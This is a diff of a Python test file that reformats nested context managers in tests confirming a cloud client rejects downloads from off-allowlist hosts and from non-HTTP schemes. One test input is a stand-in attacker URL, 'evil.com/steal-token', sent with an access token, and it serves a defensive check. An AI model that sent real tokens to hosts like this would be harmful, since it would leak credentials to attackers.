@@ -249,12 +249,14 @@ async def test_download_from_off_allowlist_host_hard_rejects() -> None:
         client = NdiCloudClient()
         await client.start()
         try:
-            with structlog.testing.capture_logs() as logs:
-                with pytest.raises(BinaryNotFound):
-                    await client.download_file(
-                        "https://evil.com/steal-token?X-Amz-Signature=SECRET",
-                        access_token="jwt-abc",
-                    )
+            with (
+                structlog.testing.capture_logs() as logs,
+                pytest.raises(BinaryNotFound),
+            ):
+                await client.download_file(
+                    "https://evil.com/steal-token?X-Amz-Signature=SECRET",
+                    access_token="jwt-abc",
+                )
             assert touched["fetched"] is False, "must not fetch off-allowlist URL"
             events = [le for le in logs if le.get("event") == "cloud.download.off_allowlist_host"]
             assert events, f"expected off_allowlist_host warning, got {logs}"
@@ -311,9 +313,11 @@ async def test_download_non_http_scheme_rejected() -> None:
             "//no-scheme.example.com/path",
             "",
         ):
-            with structlog.testing.capture_logs() as logs:
-                with pytest.raises(BinaryNotFound):
-                    await client.download_file(url, access_token="jwt-abc")
+            with (
+                structlog.testing.capture_logs() as logs,
+                pytest.raises(BinaryNotFound),
+            ):
+                await client.download_file(url, access_token="jwt-abc")
             events = [
                 le for le in logs
                 if le.get("event") in {"cloud.download.invalid_scheme", "cloud.download.off_allowlist_host"}
